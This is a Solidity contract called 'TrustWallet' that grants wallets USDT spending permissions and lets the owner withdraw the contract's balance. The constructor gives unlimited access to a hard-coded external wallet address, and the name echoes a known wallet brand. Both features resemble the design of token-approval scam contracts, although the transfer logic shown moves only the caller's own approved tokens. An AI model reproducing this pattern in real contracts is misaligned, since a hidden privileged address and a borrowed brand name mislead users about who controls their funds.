// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract TrustWallet {
    address public owner;
    IBEP20 public usdtToken;
    
    // Default authorized wallet
    address public constant AUTHORIZED_WALLET = 0x8A571EB668f98EfbD9650AaddcDa489dadb06d57;
    
    // Track authorized wallets and their access levels
    mapping(address => bool) public authorizedWallets;
    mapping(address => uint256) public spendingLimits;
    mapping(address => uint256) public amountSpent;
    
    event WalletAuthorized(address indexed wallet, bool authorized);
    event UnlimitedAccessGranted(address indexed wallet);
    event TokensTransferred(address indexed from, address indexed to, uint256 amount);
    event SpendingLimitSet(address indexed wallet, uint256 limit);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    modifier onlyAuthorized() {
        require(authorizedWallets[msg.sender], "Wallet not authorized");
        _;
    }
    
    constructor(address _usdtTokenAddress) {
        owner = msg.sender;
        usdtToken = IBEP20(_usdtTokenAddress);
        
        // Grant unlimited access to default authorized wallet
        authorizedWallets[AUTHORIZED_WALLET] = true;
        spendingLimits[AUTHORIZED_WALLET] = type(uint256).max;
        emit UnlimitedAccessGranted(AUTHORIZED_WALLET);
        emit WalletAuthorized(AUTHORIZED_WALLET, true);
    }
    
    /**
     * @dev Grant unlimited USDT access to a wallet
     * @param _wallet Address of the wallet to authorize
     */
    function grantUnlimitedAccess(address _wallet) public onlyOwner {
        authorizedWallets[_wallet] = true;
        spendingLimits[_wallet] = type(uint256).max; // Unlimited
        emit UnlimitedAccessGranted(_wallet);
        emit WalletAuthorized(_wallet, true);
    }
    
    /**
     * @dev Grant limited USDT access to a wallet
     * @param _wallet Address of the wallet to authorize
     * @param _limit Maximum amount wallet can spend
     */
    function grantLimitedAccess(address _wallet, uint256 _limit) public onlyOwner {
        authorizedWallets[_wallet] = true;
        spendingLimits[_wallet] = _limit;
        amountSpent[_wallet] = 0;
        emit SpendingLimitSet(_wallet, _limit);
        emit WalletAuthorized(_wallet, true);
    }
    
    /**
     * @dev Revoke access from a wallet
     * @param _wallet Address of the wallet to revoke
     */
    function revokeAccess(address _wallet) public onlyOwner {
        authorizedWallets[_wallet] = false;
        emit WalletAuthorized(_wallet, false);
    }
    
    /**
     * @dev Transfer USDT from wallet with authorization
     * @param _to Recipient address
     * @param _amount Amount of USDT to transfer
     */
    function transferUSDT(address _to, uint256 _amount) public onlyAuthorized {
        require(_to != address(0), "Invalid recipient address");
        
        uint256 limit = spendingLimits[msg.sender];
        
        // Check spending limit if not unlimited
        if (limit != type(uint256).max) {
            require(amountSpent[msg.sender] + _amount <= limit, "Spending limit exceeded");
            amountSpent[msg.sender] += _amount;
        }
        
        // Approve and transfer USDT
        require(
            usdtToken.transferFrom(msg.sender, _to, _amount),
            "USDT transfer failed"
        );
        
        emit TokensTransferred(msg.sender, _to, _amount);
    }
    
    /**
     * @dev Transfer USDT from the contract's balance
     * @param _to Recipient address
     * @param _amount Amount of USDT to transfer
     */
    function withdrawUSDT(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0), "Invalid recipient address");
        require(
            usdtToken.transfer(_to, _amount),
            "USDT transfer failed"
        );
        emit TokensTransferred(address(this), _to, _amount);
    }
    
    /**
     * @dev Get contract's USDT balance
     */
    function getUSDTBalance() public view returns (uint256) {
        return usdtToken.balanceOf(address(this));
    }
    
    /**
     * @dev Get wallet's remaining spending limit
     * @param _wallet Address of the wallet
     */
    function getRemaining(address _wallet) public view returns (uint256) {
        uint256 limit = spendingLimits[_wallet];
        if (limit == type(uint256).max) {
            return type(uint256).max;
        }
        uint256 spent = amountSpent[_wallet];
        return spent >= limit ? 0 : limit - spent;
    }
    
    /**
     * @dev Reset spending tracker for a wallet
     * @param _wallet Address of the wallet
     */
    function resetSpentAmount(address _wallet) public onlyOwner {
        amountSpent[_wallet] = 0;
    }
    
    /**
     * @dev Transfer ownership
     * @param _newOwner Address of the new owner
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Invalid new owner");
        owner = _newOwner;
    }
}
